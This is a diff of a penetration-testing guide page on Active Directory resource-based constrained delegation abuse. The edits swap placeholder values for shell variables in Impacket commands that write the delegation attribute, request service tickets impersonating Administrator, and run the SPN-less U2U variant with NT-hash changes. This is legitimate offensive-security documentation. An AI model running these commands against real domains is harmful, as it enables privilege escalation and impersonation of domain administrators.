@@ -61,10 +61,10 @@ In the end, an RBCD abuse results in a Service Ticket to authenticate on the tar
 
 ```bash
 # Read the attribute
-rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'
+rbcd.py -delegate-to "$TARGET$" -dc-ip "$DC_HOST" -action 'read' "$DOMAIN/$USER:$PASSWORD"
 
 # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
+rbcd.py -delegate-from "$CONTROLLED_ACCOUNT" -delegate-to "$TARGET$" -dc-ip "$DC_HOST" -action 'write' "$DOMAIN/$USER:$PASSWORD"
 ```
 
 
@@ -81,7 +81,7 @@ Once the attribute has been modified, the [Impacket](https://github.com/SecureAu
 
 
 ```bash
-getST.py -spn 'cifs/target' -impersonate "Administrator" -dc-ip "$DC_IP$" "$DOMAIN"/"$ACCOUNT_WITH_SPN":"$PASSWORD"
+getST.py -spn 'cifs/target' -impersonate "Administrator" -dc-ip "$DC_IP" "$DOMAIN"/"$ACCOUNT_WITH_SPN":"$PASSWORD"
 ```
 
 
@@ -214,19 +214,19 @@ From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (
 
 ```bash
 # Obtain a TGT through overpass-the-hash to use RC4
-getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'
+getTGT.py -hashes :$(pypykatz crypto nt "$PASSWORD") "$DOMAIN/$USER"
 
 # Obtain the TGT session key
-describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'
+describeTicket.py "$USER.ccache" | grep 'Ticket Session Key'
 
 # Change the controlledaccountwithoutSPN's NT hash with the TGT session key
-changepasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'
+changepasswd.py -newhashes :TGTSessionKey "$DOMAIN/$USER:$PASSWORD"@"$DC_HOST"
 
 # Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
-KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'
+KRB5CCNAME="$USER.ccache" getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass "$DOMAIN/$USER"
 
 # The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
-changepasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
+changepasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash "$DOMAIN/$USER"@"$DC_HOST"
 ```
 
 This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
